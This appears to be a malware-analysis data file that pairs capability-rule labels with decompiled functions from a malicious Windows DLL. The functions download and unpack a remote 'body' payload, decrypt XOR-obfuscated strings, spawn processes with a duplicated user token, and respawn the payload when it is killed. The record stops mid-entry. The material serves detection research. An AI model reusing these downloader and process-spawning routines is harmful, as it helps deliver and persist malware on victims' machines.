{
    "00401035": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00401035(uint param_1, int32_t *param_2)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    char *pcVar5;\n    uint *puVar6;\n    uint s;\n    int32_t *var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puVar4 = \"abcdefghijklmnopqrstuvwxyz.-_1234567890\";\n    puVar6 = &s;\n    var_ch = param_2;\n    var_8h = param_1;\n    for (iVar3 = 10; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar6 = puVar6 + 1;\n    }\n    iVar3 = 0;\n    pcVar5 = 0x427910;\n    do {\n        bVar1 = true;\n        var_4h = 0;\n        do {\n            if ((pcVar5[iVar3] != '\\0') && (iVar2 = (*_sym.imp.ntdll.dll_strchr)(&s, pcVar5[iVar3]),  iVar2 == 0)) {\n                bVar1 = false;\n                break;\n            }\n            var_4h = var_4h + 1;\n        } while (var_4h < 0x20);\n        fcn.00403bde(\"GTK DLL: bodydownloader.cpp:%d > FindSuitableBodyDomain : CurrentDomain : %p (cheack at debugger), bDomainNameCheckPassed = %d\"\n                     , 0x26);\n        if (((*pcVar5 != '\\0') && (pcVar5[0x1f] == '\\0')) && (bVar1)) {\n            iVar2 = fcn.00404735();\n            fcn.00403bde(\"GTK DLL: bodydownloader.cpp:%d > FindSuitableBodyDomain : dwRemoteFileHash : %p\", 0x2f);\n            if (iVar2 != -1) {\n                *var_ch = iVar2;\n                return iVar3;\n            }\n            (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n        }\n        pcVar5 = pcVar5 + 0x20;\n        iVar3 = iVar3 + 1;\n        if (0x427a4f < pcVar5) {\n            return -1;\n        }\n    } while( true );\n}\n",
        "token_count": 553
    },
    "004010fa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004010fa(int32_t lpString2)\n\n{\n    int32_t *in_ECX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    uint *puVar6;\n    uchar *puVar7;\n    char *pcVar8;\n    int32_t var_ch;\n    int32_t var_8h;\n    uchar *lpString1;\n    \n    uVar3 = 0;\n    puVar6 = &var_ch;\n    for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    if (((*in_ECX != 0) && (in_ECX[1] != 0)) && (iVar1 = fcn.0040a2a4(),  -1 < iVar1)) {\n        fcn.00403bde(\"GTK DLL: bodydownloader.cpp:%d > UnpackReadyBodyAndInitializeDomainList : body unpacked to %d bytes\"\n                     , 0x54);\n        lpString1 = 0x44444444;\n        uVar2 = 0;\n        if (var_ch != 4) {\n            do {\n                iVar1 = 0;\n                while (*(iVar1 + uVar2 + var_8h) == *(&lpString1 + iVar1)) {\n                    iVar1 = iVar1 + 1;\n                    if (3 < iVar1) {\n                        lpString1 = var_8h + uVar2;\n                        goto code_r0x00401182;\n                    }\n                }\n                uVar2 = uVar2 + 1;\n            } while (uVar2 < var_ch - 4U);\n        }\n        lpString1 = NULL;\ncode_r0x00401182:\n        puVar7 = lpString1;\n        fcn.00403bde(\"GTK DLL: bodydownloader.cpp:%d > UnpackReadyBodyAndInitializeDomainList : Marker found at %p\\n\", \n                     0x60);\n        puVar5 = lpString1;\n        if (puVar7 != NULL) {\n            puVar4 = puVar7;\n            for (iVar1 = 0x184; iVar1 != 0; iVar1 = iVar1 + -1) {\n                *puVar4 = 0;\n                puVar4 = puVar4 + 1;\n            }\n            puVar4 = 0x427910;\n            for (iVar1 = 0x184; iVar1 != 0; iVar1 = iVar1 + -1) {\n                *puVar7 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar7 = puVar7 + 1;\n            }\n            puVar7 = lpString1;\n            for (iVar1 = 0x140; iVar1 != 0; iVar1 = iVar1 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            pcVar8 = 0x427910;\n            (*_sym.imp.KERNEL32.dll_lstrcpyA)(lpString1, lpString2 * 0x20 + 0x427910);\n            fcn.00403bde(\"GTK DLL: bodydownloader.cpp:%d > UnpackReadyBodyAndInitializeDomainList : BodyData->Domains[0].Name : %s\"\n                         , 0x6f);\n            do {\n                puVar5 = puVar5 + 0x20;\n                if (*pcVar8 != '\\0') {\n                    (*_sym.imp.KERNEL32.dll_lstrcpyA)(puVar5, pcVar8);\n                    fcn.00403bde(\"GTK DLL: bodydownloader.cpp:%d > UnpackReadyBodyAndInitializeDomainList : BodyData->Domains[%d].Name : %s\"\n                                 , 0x75);\n                }\n                pcVar8 = pcVar8 + 0x20;\n            } while (pcVar8 < 0x427a30);\n        }\n        fcn.00403bde(\"GTK DLL: bodydownloader.cpp:%d > UnpackReadyBodyAndInitializeDomainList : body downloaded, call SetEvent(hReadyEvent)\"\n                     , 0x7a);\n        fcn.0040cff1();\n        *0x427aa4 = var_ch;\n        uVar3 = 1;\n        *0x427aa8 = var_8h;\n    }\n    return uVar3;\n}\n",
        "token_count": 997
    },
    "00401246": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040133a)\n// WARNING: Removing unreachable block (ram,0x00401355)\n// WARNING: Removing unreachable block (ram,0x0040135c)\n// WARNING: Removing unreachable block (ram,0x00401363)\n// WARNING: Removing unreachable block (ram,0x0040138d)\n\nuint __cdecl fcn.00401246(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uchar auStack408 [404];\n    \n    (*_sym.imp.WS2_32.dll_WSAStartup)(0x201, auStack408);\n    puVar3 = &stack0xfffffe54;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = 0x427aa4;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    iVar2 = fcn.0040d0df();\n    if (iVar2 != 0) {\n        fcn.00403bde(\"GTK DLL: bodydownloader.cpp:%d > BodyDownloaderThread : Is SYSTEM user, bypass body downloading\", \n                     0x96);\n        (*_sym.imp.KERNEL32.dll_SetEvent)(*0x427d34);\n        (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    }\n    cVar1 = fcn.0040ca70();\n    if ((cVar1 != '\\0') && (iVar2 = fcn.004010fa(0),  iVar2 != 0)) {\n        fcn.0040cff1();\n        (*_sym.imp.KERNEL32.dll_SetEvent)(*0x427d34);\n    }\n    fcn.00403bde(\"GTK DLL: bodydownloader.cpp:%d > BodyDownloaderThread : initial body stage finish, start redownload loop\"\n                 , 0xa5);\n    while (*0x427df4 == 0) {\n        iVar2 = fcn.00401035();\n        if (iVar2 != -1) {\n            fcn.004047ce();\n            fcn.00403bde(\"GTK DLL: bodydownloader.cpp:%d > BodyDownloaderThread : dwLocalFileHash : %p\", 0xb3);\n            fcn.00403bde(\"GTK DLL: bodydownloader.cpp:%d > BodyDownloaderThread : remote body not changed\", 0xcd);\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n    }\n    return 0;\n}\n",
        "token_count": 612
    },
    "00403079": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00403079(uint param_1, int32_t *param_2)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    code *pcVar10;\n    int32_t *piVar11;\n    uint *puVar12;\n    uint lpCommandLine;\n    int32_t var_a8h;\n    uint var_84h;\n    uint var_80h;\n    int32_t var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    int32_t var_54h;\n    uint pSessionId;\n    uint TokenHandle;\n    uint pSid;\n    uint hExistingToken;\n    uint pIdentifierAuthority;\n    uint var_3ch;\n    int32_t *var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint hToken;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_58h = 4;\n    var_3ch._0_2_ = 0x1000;\n    piVar11 = param_2;\n    for (iVar6 = 0x10; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *piVar11 = 0;\n        piVar11 = piVar11 + 1;\n    }\n    pSessionId = 0;\n    puVar12 = &lpCommandLine;\n    var_38h = param_2;\n    for (iVar6 = 0x44; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar12 = 0;\n        puVar12 = puVar12 + 1;\n    }\n    hToken = 0;\n    puVar12 = &var_60h;\n    for (iVar6 = 8; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar12 = 0;\n        puVar12 = puVar12 + 1;\n    }\n    hExistingToken = 0;\n    var_34h = 0;\n    pSid = 0;\n    pIdentifierAuthority = 0;\n    iVar6 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x2000000, 0, param_1);\n    if (iVar6 != 0) {\n        var_68h = iVar6;\n        iVar3 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(param_1, &pSessionId);\n        pcVar10 = _sym.imp.KERNEL32.dll_CloseHandle;\n        if (iVar3 != 0) {\n            iVar3 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(iVar6, 0x201eb, &hExistingToken);\n            if (iVar3 != 0) {\n                fcn.00401a76();\n                iVar3 = (*_sym.imp.ADVAPI32.dll_DuplicateTokenEx)(hExistingToken, 0x2000000, 0, 1, 1, &hToken);\n                pcVar2 = _sym.imp.ADVAPI32.dll_SetTokenInformation;\n                if (iVar3 != 0) {\n                    (*_sym.imp.ADVAPI32.dll_SetTokenInformation)(hToken, 0xc, pSessionId, 4);\n                    iVar6 = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                                      (&pIdentifierAuthority, 1, 0x4000, 0, 0, 0, 0, 0, 0, 0, &pSid);\n                    if (iVar6 != 0) {\n                        var_5ch = 0x20;\n                        var_60h = pSid;\n                        iVar6 = (*_sym.imp.ADVAPI32.dll_GetLengthSid)(pSid);\n                        (*pcVar2)(hToken, 0x19, &var_60h, iVar6 + 8);\n                        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n                    }\n                    var_64h = 0;\n                    (*pcVar2)(hToken, 0x1b, &var_64h, 4);\n                    iVar6 = (*_sym.imp.USERENV.dll_CreateEnvironmentBlock)(&var_34h, hToken, 1);\n                    if (iVar6 == 0) {\n                        var_34h = 0;\n                    }\n                    else {\n                        var_58h = 0x404;\n                    }\n                    lpCommandLine = 0x44;\n                    var_2ch = 0x68276242;\n                    var_28h = 0x4f0a520d;\n                    var_24h = 0x682f6241;\n                    var_20h = 0x4f255253;\n                    var_1ch = 0x682b6251;\n                    var_18h = 0x4f185205;\n                    var_14h = 0x68226240;\n                    var_10h = 0x4f795217;\n                    var_8h = 0x684e6235;\n                    var_4h = 0x4f795263;\n                    fcn.00401000(0x40);\n                    uVar7 = 0;\n                    do {\n                        puVar1 = uVar7 + var_54h;\n                        uVar4 = uVar7 & 0x80000007;\n                        if (uVar4 < 0) {\n                            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n                        }\n                        uVar7 = uVar7 + 1;\n                        *puVar1 = *(&var_8h + uVar4) ^ puVar1[&var_2ch - var_54h];\n                    } while (uVar7 < 0x20);\n                    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > CreateBodyProcessAsTargetUser : decrypt (wide char) %s -> %ws\"\n                                 , 0x1d2);\n                    var_24h = 0x424f6717;\n                    var_20h = 0x640c7008;\n                    var_1ch = 0x6b313908;\n                    var_18h = 0x674a6404;\n                    var_14h = 0x7013425c;\n                    var_10h = 0x39676401;\n                    var_8h = 0x42396764;\n                    var_4h = var_4h & 0xff000000 | 0x64706b;\n                    fcn.00401000(0x30);\n                    iVar6 = var_30h;\n                    iVar9 = 0;\n                    iVar3 = &var_24h - var_30h;\n                    do {\n                        var_30h = 7;\n                        puVar1 = iVar9 + iVar6;\n                        iVar8 = iVar9 % 7;\n                        iVar9 = iVar9 + 1;\n                        *puVar1 = *(&var_8h + iVar8) ^ puVar1[iVar3];\n                    } while (iVar9 < 0x18);\n                    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > CreateBodyProcessAsTargetUser : decrypt (wide char) %s -> %ws\"\n                                 , 0x1d3);\n                    var_a8h = var_54h;\n                    var_80h._0_2_ = 0;\n                    var_84h = 1;\n                    (*_sym.imp.ADVAPI32.dll_CreateProcessAsUserW)\n                              (hToken, iVar6, 0, 0, 0, 0, var_58h, var_34h, 0, &lpCommandLine, var_38h);\n                    pcVar10 = _sym.imp.KERNEL32.dll_CloseHandle;\n                    if (*var_38h != 0) {\n                        iVar3 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(*var_38h, 0x201eb, &TokenHandle);\n                        if (iVar3 != 0) {\n                            fcn.00401a76();\n                            (*pcVar10)(TokenHandle);\n                        }\n                        (*pcVar10)(var_38h[1]);\n                    }\n                    if (var_34h != 0) {\n                        (*_sym.imp.USERENV.dll_DestroyEnvironmentBlock)(var_34h);\n                    }\n                    (*pcVar10)(hToken);\n                    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                    pcVar10 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n                    uVar5 = (*pcVar2)(0, var_54h);\n                    (*pcVar10)(uVar5);\n                    pcVar10 = _sym.imp.KERNEL32.dll_CloseHandle;\n                    param_2 = var_38h;\n                    iVar6 = var_68h;\n                }\n                (*pcVar10)(hExistingToken);\n            }\n        }\n        (*pcVar10)(iVar6);\n    }\n    return *param_2;\n}\n",
        "token_count": 2130
    },
    "004033ad": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004033ad(uint *param_1)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint *puVar8;\n    uint lpCommandLine;\n    uint var_94h;\n    int32_t var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4ch = 0x633f6766;\n    var_48h = 0x47404c1c;\n    iVar6 = 0x44;\n    var_44h = 0x63096737;\n    puVar8 = param_1;\n    for (iVar5 = 0x10; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_40h = 0x47614c08;\n    var_3ch = 0x6303672c;\n    puVar8 = &var_94h;\n    for (; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_94h = 0x44;\n    var_38h = 0x47164c11;\n    puVar8 = &lpCommandLine;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_34h = 0x631f671f;\n    var_30h = 0x47404c1c;\n    var_2ch = 0x63096737;\n    var_28h = 0x47004c08;\n    var_24h = 0x63306771;\n    var_20h = 0x47454c16;\n    var_1ch = 0x63046720;\n    var_18h = 0x47404c0a;\n    var_14h = 0x63426737;\n    var_10h = 0x474b4c00;\n    var_ch = 0x636c6726;\n    var_8h = 0x636c6743;\n    var_4h = 0x47334c65;\n    fcn.00401000(0x88);\n    uVar7 = 0;\n    do {\n        puVar1 = uVar7 + var_50h;\n        uVar3 = uVar7 & 0x80000007;\n        if (uVar3 < 0) {\n            uVar3 = (uVar3 - 1 | 0xfffffff8) + 1;\n        }\n        uVar7 = uVar7 + 1;\n        *puVar1 = *(&var_8h + uVar3) ^ puVar1[&var_4ch - var_50h];\n    } while (uVar7 < 0x44);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > CreateBodyProcessAsCurrentUser : decrypt (wide char) %s -> %ws\", 0x218);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(var_50h, &lpCommandLine, 0x104);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > CreateBodyProcessAsCurrentUser : szSvchostExecutablePath : %ws\", 0x221);\n    (*_sym.imp.KERNEL32.dll_CreateProcessW)(0, &lpCommandLine, 0, 0, 0, 0x800000c, 0, 0, &var_94h, param_1);\n    if (param_1[1] != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(param_1[1]);\n    }\n    uVar2 = *param_1;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_50h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return uVar2;\n}\n",
        "token_count": 1085
    },
    "00403530": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00403530(uint arg_8h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    ushort uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int16_t *piVar6;\n    int32_t iVar7;\n    uint32_t uStack580;\n    uint uStack576;\n    int32_t iStack572;\n    ulong uStack568;\n    uint uStack560;\n    uint uStack556;\n    int32_t iStack552;\n    uint uStack548;\n    uchar auStack544 [16];\n    int16_t iStack528;\n    uchar auStack526 [522];\n    \n    uStack568 = 0;\n    uStack560 = 0;\n    uStack580 = 0;\n    uStack556 = 0;\n    iStack572 = 0;\n    auStack544 = ZEXT816(0);\n    iStack552 = 0;\n    uStack548 = 0;\n    iStack528 = 0;\n    sub.ntdll.dll_memset(auStack526, 0, 0x206);\n    if (*0x427d44 == 0) {\n        fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > UserSupportSubprocessThread : NONSYSTEM user, call CreateBodyProcessAsCurrentUser\"\n                     , 0x24d);\n        *0x427aac = fcn.004033ad();\n        uStack568._0_4_ = *0x427aa8;\n        iVar7 = *0x427aa4;\n    }\n    else {\n        fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > UserSupportSubprocessThread : SYSTEM user, call CreateBodyProcessAsTargetUser\"\n                     , 0x23e);\n        *0x427aac = fcn.00403079();\n        iVar4 = fcn.00406ef1(&iStack572);\n        uStack568._0_4_ = uStack580;\n        iVar7 = iStack572;\n        if (iVar4 != 0) {\n            goto code_r0x0040361f;\n        }\n    }\n    uStack568._4_4_ = uStack568 >> 0x1f;\n    uStack568 = uStack568;\n    iStack552 = iVar7;\ncode_r0x0040361f:\n    iVar7 = iStack552;\n    if (*0x427aac == 0) {\n        piVar6 = &iStack528;\n        do {\n            iVar1 = *piVar6;\n            piVar6 = piVar6 + 1;\n        } while (iVar1 != 0);\n        if (piVar6 - auStack526 >> 1 != 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_FindAtomW)(&iStack528);\n            (*_sym.imp.KERNEL32.dll_DeleteAtom)(uVar3);\n        }\n    }\n    else {\n        fcn.004013d8();\n        if ((iVar7 != 0) && ((uStack568 | uStack568._4_4_) != 0)) {\n            fcn.0040cd74();\n            fcn.00408805((*0x427d3c & 1) << 4);\n        }\n        uStack580 = *0x427aac;\n        uStack576 = *0x427d34;\n        (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(2, &uStack580, 0, 0xffffffff);\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(*0x427aac, 0);\n        uVar5 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00403530, arg_8h, 0, 0);\n        pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar5);\n        (*pcVar2)(*0x427aac);\n    }\n    (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 927
    },
    "004036f6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004036f6(uint noname_0, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    uint var_30ch;\n    uint var_104h;\n    \n    var_30ch._0_2_ = 0;\n    sub.ntdll.dll_memset(&var_30ch + 2, 0, 0x206);\n    pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n    if (*0x427d44 == 0) {\n        uVar6 = 0;\n        do {\n            if (*(uVar6 + 0x4151c0) == arg_ch) {\n                if (arg_10h == *0x427d38) {\n                    return 1;\n                }\n                if (arg_ch == -0x37b0bf10) {\n                    puVar7 = &var_104h;\n                    for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n                        *puVar7 = 0;\n                        puVar7 = puVar7 + 1;\n                    }\n                    var_104h._0_1_ = 0;\n                    if ((arg_14h != 0) &&\n                       (iVar4 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x100410, 0, arg_14h),  iVar4 != 0)) {\n                        (*_sym.imp.PSAPI.DLL_GetProcessImageFileNameA)(iVar4, &var_104h, 0x104);\n                        (*pcVar1)(iVar4);\n                    }\n                    pcVar2 = _sym.imp.KERNEL32.dll_lstrlenA;\n                    iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(&var_104h);\n                    if (iVar4 != 0) {\n                        (*pcVar2)(&var_104h);\n                        iVar4 = fcn.004077d4();\n                        if (iVar4 == -0x37b0bf10) {\n                            return 1;\n                        }\n                    }\n                }\n                iVar4 = fcn.00401636();\n                if (iVar4 != 0) {\n                    return 1;\n                }\n                puVar7 = &var_30ch;\n                for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar7 = 0;\n                    puVar7 = puVar7 + 1;\n                }\n                iVar4 = fcn.004013d8();\n                if (iVar4 == 0) {\n                    return 1;\n                }\n                fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > EnumCallback : %d : %ws\", 0x2ce);\n                iVar4 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(&var_30ch, 0x427ab0);\n                if (iVar4 != 0) {\n                    return 1;\n                }\n                uVar5 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040196c, arg_10h, 0, 0);\n                (*pcVar1)(uVar5);\n                return 1;\n            }\n            uVar6 = uVar6 + 4;\n        } while (uVar6 < 0x2c);\n    }\n    else if ((((arg_ch == 0x74fc6984) && (iVar4 = fcn.00401636(),  iVar4 == 0)) && (iVar4 = fcn.004013d8(),  iVar4 != 0)\n             ) && (iVar3 = (*_sym.imp.KERNEL32.dll_FindAtomW)(&var_30ch),  iVar3 == 0)) {\n        (*_sym.imp.KERNEL32.dll_AddAtomW)(&var_30ch);\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0xc);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n        *(iVar4 + 8) = arg_10h;\n        uVar5 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00403530, iVar4, 0, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar5);\n    }\n    return 1;\n}\n",
        "token_count": 1024
    },
    "004038dc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004038dc(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uchar *puVar7;\n    \n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > BodySpawnerThread : wait for downloader thread...\", 0x2e4);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > BodySpawnerThread : g_IsSystemUser : %d\", 0x2e6);\n    uVar6 = 0;\n    if (((*0x427d44 == 0) && (iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x427d34, 0xffffffff),  iVar2 == 0))\n       && (fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > BodySpawnerThread : ready to spwn!\", 0x2ea),  *arg_8h == 0x20)) {\n        fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > BodySpawnerThread : LoadDllInCurrentProcess...\", 0x2ef);\n        puVar7 = 0x427ab0;\n        for (iVar2 = 0x208; pcVar1 = _sym.imp.KERNEL32.dll_GetCurrentProcessId,  iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar7 = 0;\n            puVar7 = puVar7 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        fcn.004013d8();\n        fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > BodySpawnerThread : g_wszCurrentUserSessionString : %ws\", 0x2f8);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0xc);\n        piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        piVar4[1] = arg_8h[2];\n        *piVar4 = arg_8h[1];\n        iVar2 = (*pcVar1)();\n        piVar4[2] = iVar2;\n        uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00403530, piVar4, 0, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n        fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > BodySpawnerThread : LoadDllInCurrentProcess (UserSupportSubprocessThread) -> done\"\n                     , 0x30a);\n    }\n    uVar5 = 0;\n    do {\n        *(uVar5 + 0x423220) = *(uVar5 + 0x423220) ^ *(uVar5 % 0xe + 0x423210);\n        uVar5 = uVar5 + 1;\n    } while (uVar5 < 0x4400);\n    do {\n        str.geu6RIBCgZ9jJTsj_[uVar6 + 0x10] = str.geu6RIBCgZ9jJTsj_[uVar6 + 0x10] ^ str.geu6RIBCgZ9jJTsj_[uVar6 & 0xf];\n        uVar6 = uVar6 + 1;\n    } while (uVar6 < 0x6200);\n    while (*0x427df4 == 0) {\n        fcn.0040a6ae();\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n    }\n    return 0;\n}\n",
        "token_count": 854
    },
    "00403d39": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
